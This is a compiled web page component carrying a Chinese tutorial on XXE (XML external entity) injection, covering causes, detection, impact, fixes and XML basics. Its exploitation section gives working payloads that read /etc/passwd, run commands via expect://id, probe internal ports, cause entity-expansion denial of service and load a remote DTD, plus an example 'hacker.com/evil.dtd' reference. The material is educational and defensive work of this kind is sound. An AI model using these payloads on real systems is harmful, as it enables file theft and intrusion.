import{_ as n,W as a,X as s,a1 as t}from"./framework-b6a07282.js";const e="/assets/1-f306b1cc.jpg",l="/assets/2-1bb1966a.jpg",p="/assets/3-2ddf50db.jpg",i={},c=t('<h2 id="xxe外部实体注入" tabindex="-1"><a class="header-anchor" href="#xxe外部实体注入" aria-hidden="true">#</a> XXE外部实体注入</h2><h3 id="_1-该漏洞是什么" tabindex="-1"><a class="header-anchor" href="#_1-该漏洞是什么" aria-hidden="true">#</a> 1.该漏洞是什么？</h3><ul><li>外部实体注入（<strong>X</strong>ML E<strong>x</strong>ternal <strong>E</strong>ntity）</li><li>如果Web应用的脚本代码没有限制XML引入外部实体，从而导致用户可以插入一个外部实体，并且其中的内容会被服务器端执行，插入的代码可能导致任意文件读取、系统命令执行、内网端口 探测、攻击内网网站等危害。</li></ul><h3 id="_2-漏洞的发生原因是什么" tabindex="-1"><a class="header-anchor" href="#_2-漏洞的发生原因是什么" aria-hidden="true">#</a> 2.漏洞的发生原因是什么？</h3><ul><li>XXE漏洞发生在应用程序解析XML输入时，没有禁止<strong>外部实体</strong>的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。</li><li>也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制，从而导致漏洞。</li></ul><h3 id="_3-如何发现是否存在这个漏洞" tabindex="-1"><a class="header-anchor" href="#_3-如何发现是否存在这个漏洞" aria-hidden="true">#</a> 3.如何发现是否存在这个漏洞？</h3><ul><li>工具扫描，如AWVS。</li><li>抓包查看是否使用XML传输数据</li></ul><img src="'+e+`" style="zoom:80%;"><h3 id="_4-该漏洞会造成什么危害" tabindex="-1"><a class="header-anchor" href="#_4-该漏洞会造成什么危害" aria-hidden="true">#</a> 4.该漏洞会造成什么危害？</h3><ul><li>文件读取：可以加载恶意外部文件，从而读取服务器上的敏感文件，如配置文件、密码文件等。</li><li>命令执行：可以加载恶意外部代码，从而在服务器上执行任意命令，如反弹shell、删除文件等。</li><li>内网攻击：可以加载恶意外部资源，从而对内网进行端口扫描、网站攻击等。</li><li>DOS攻击：可以加载恶意外部实体，从而消耗服务器的资源，导致服务不可用。</li></ul><h3 id="_5-如何利用这个漏洞" tabindex="-1"><a class="header-anchor" href="#_5-如何利用这个漏洞" aria-hidden="true">#</a> 5.如何利用这个漏洞？</h3><h4 id="内部实体" tabindex="-1"><a class="header-anchor" href="#内部实体" aria-hidden="true">#</a> 内部实体</h4><ul><li>内部实体：内部实体是在XML文档中定义和引用的，例如<code>&lt;!ENTITY 实体名称 ”实体的值”&gt;</code>。</li></ul><div class="language-xml line-numbers-mode" data-ext="xml"><pre class="language-xml"><code><span class="token prolog">&lt;?xml version = &quot;1.0&quot;?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset">
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">hacker</span> <span class="token attr-name">&quot;xy&quot;</span><span class="token punctuation">&gt;</span></span>
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>test</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;hacker;">&amp;hacker;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>test</span><span class="token punctuation">&gt;</span></span>

#定义一个内部实体叫做name，它的值是“张三”，然后在XML文档中使用它：
<span class="token prolog">&lt;?xml version = &quot;1.0&quot;?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span> <span class="token punctuation">[</span><span class="token internal-subset">
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">name</span> <span class="token attr-name">&quot;张三&quot;</span><span class="token punctuation">&gt;</span></span>
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;name;">&amp;name;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="利用外部实体注入" tabindex="-1"><a class="header-anchor" href="#利用外部实体注入" aria-hidden="true">#</a> 利用外部实体注入</h4><ul><li>外部实体：外部实体是在XML文档之外定义和引用的，表示外部文件的内容，例如<code>&lt;!ENTITY 实体名称 SYSTEM ”URI”&gt;</code>。</li></ul><h5 id="文件读取" tabindex="-1"><a class="header-anchor" href="#文件读取" aria-hidden="true">#</a> 文件读取</h5><div class="language-xml line-numbers-mode" data-ext="xml"><pre class="language-xml"><code><span class="token prolog">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">name</span> <span class="token punctuation">[</span><span class="token internal-subset">
&lt;!ENTITY xxe SYSTEM &quot;file:///C:/Windows/system.ini&quot;&gt;
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>

<span class="token prolog">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">data</span> <span class="token punctuation">[</span><span class="token internal-subset">
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">data</span> <span class="token attr-name">(#ANY)</span><span class="token punctuation">&gt;</span></span>
&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token entity named-entity" title="&amp;file;">&amp;file;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="远程命令执行" tabindex="-1"><a class="header-anchor" href="#远程命令执行" aria-hidden="true">#</a> 远程命令执行</h5><div class="language-xml line-numbers-mode" data-ext="xml"><pre class="language-xml"><code><span class="token prolog">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">GVI</span> <span class="token punctuation">[</span><span class="token internal-subset"> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">foo</span> <span class="token attr-name">ANY</span> <span class="token punctuation">&gt;</span></span>
&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>catalog</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>core</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>test101<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>core</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>catalog</span><span class="token punctuation">&gt;</span></span>


<span class="token prolog">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span> <span class="token punctuation">[</span><span class="token internal-subset">
&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot;&gt;
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="探测端口和文件" tabindex="-1"><a class="header-anchor" href="#探测端口和文件" aria-hidden="true">#</a> 探测端口和文件</h5><div class="language-xml line-numbers-mode" data-ext="xml"><pre class="language-xml"><code>#探测端口
<span class="token prolog">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span> <span class="token punctuation">[</span><span class="token internal-subset">
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">name</span> <span class="token attr-name">ANY</span><span class="token punctuation">&gt;</span></span>
&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:3306&quot;&gt;</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>test</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>test</span><span class="token punctuation">&gt;</span></span>

#探测文件
<span class="token prolog">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span> <span class="token punctuation">[</span><span class="token internal-subset">
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">name</span> <span class="token attr-name">ANY</span><span class="token punctuation">&gt;</span></span>
&lt;!ENTITY xxe SYSTEM &quot;http://localhost:9002/1.txt&quot;&gt;</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="doc攻击" tabindex="-1"><a class="header-anchor" href="#doc攻击" aria-hidden="true">#</a> Doc攻击</h5><div class="language-xml line-numbers-mode" data-ext="xml"><pre class="language-xml"><code><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">data</span> <span class="token punctuation">[</span><span class="token internal-subset">
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">data</span> <span class="token attr-name">(#ANY)</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">a0</span> <span class="token attr-name">&quot;dos&quot;</span> <span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">a1</span> <span class="token attr-name">&quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">a2</span> <span class="token attr-name">&quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;</span><span class="token punctuation">&gt;</span></span>
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token entity named-entity" title="&amp;a2;">&amp;a2;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="引入外部实体-进行注入" tabindex="-1"><a class="header-anchor" href="#引入外部实体-进行注入" aria-hidden="true">#</a> 引入外部实体，进行注入</h5><div class="language-xml line-numbers-mode" data-ext="xml"><pre class="language-xml"><code>#xml:
<span class="token prolog">&lt;?xml version=&quot;1.0&quot; ?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">a</span><span class="token punctuation">[</span><span class="token internal-subset">
&lt;!ENTITY % xxe SYSTEM &quot;http://localhost:9002/1234.dtd&quot;&gt;
%xxe;
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;send;">&amp;send;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">&gt;</span></span>

#1234.dtd：
&lt;!ENTITY send SYSTEM &quot;file:///C:/Windows/system.ini&quot;&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_6-如何修复-防御这个漏洞" tabindex="-1"><a class="header-anchor" href="#_6-如何修复-防御这个漏洞" aria-hidden="true">#</a> 6.如何修复/防御这个漏洞？</h3><ol><li>使用开发语言提供的禁用外部实体的方法</li></ol><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>PHP：
libxml_disable_entity_loader(true);
 
JAVA:
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);
 
Python：
from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="2"><li>过滤或转义用户提交的XML数据</li></ol><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&#39;
&quot;
&#39;&#39;(two apostrophe)
&quot;&quot;
&lt;
&gt;
]]&gt;
]]&gt;&gt;
&lt;!--/--&gt;
/--&gt;
--&gt;
&lt;!-- 
&lt;!
&lt;![CDATA[/]]
&lt;!DOCTYPE
&lt;!ENTITY SYSTEM，PUBLIC.
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="3"><li>使用WAF</li></ol><h3 id="_7-在有防御措施的情况下-如何绕过防御" tabindex="-1"><a class="header-anchor" href="#_7-在有防御措施的情况下-如何绕过防御" aria-hidden="true">#</a> 7.在有防御措施的情况下，如何绕过防御？</h3><ul><li>暂无</li></ul><h3 id="xml知识" tabindex="-1"><a class="header-anchor" href="#xml知识" aria-hidden="true">#</a> XML知识</h3><ul><li><p>eXtensible Markup Language 可扩展标记语言</p></li><li><p>用于：交换数据如：支付。配置文件</p></li></ul><h4 id="格式要求" tabindex="-1"><a class="header-anchor" href="#格式要求" aria-hidden="true">#</a> 格式要求</h4><ul><li>XML文档必须有根元素</li><li>XML文档必须有关闭标签</li><li>XML标签对大小写敏感</li><li>XML元素必须被正确的嵌套</li><li>XML属性必须加引号</li></ul><h4 id="完整的xml内容" tabindex="-1"><a class="header-anchor" href="#完整的xml内容" aria-hidden="true">#</a> 完整的XML内容</h4><img src="`+l+'"><h4 id="外部实体引用" tabindex="-1"><a class="header-anchor" href="#外部实体引用" aria-hidden="true">#</a> 外部实体引用</h4><table><thead><tr><th>协议</th><th>使用方式</th></tr></thead><tbody><tr><td>file</td><td>file:///etc//passwd</td></tr><tr><td>php</td><td>php://filter/read=convert.base64- encode/resource=index.php</td></tr><tr><td>http</td><td>http//:hacker.com/evil.dtd</td></tr></tbody></table><h5 id="不同语言支持的协议" tabindex="-1"><a class="header-anchor" href="#不同语言支持的协议" aria-hidden="true">#</a> 不同语言支持的协议</h5><img src="'+p+'">',44),o=[c];function d(u,r){return a(),s("div",null,o)}const k=n(i,[["render",d],["__file","XXE外部实体注入.html.vue"]]);export{k as default};
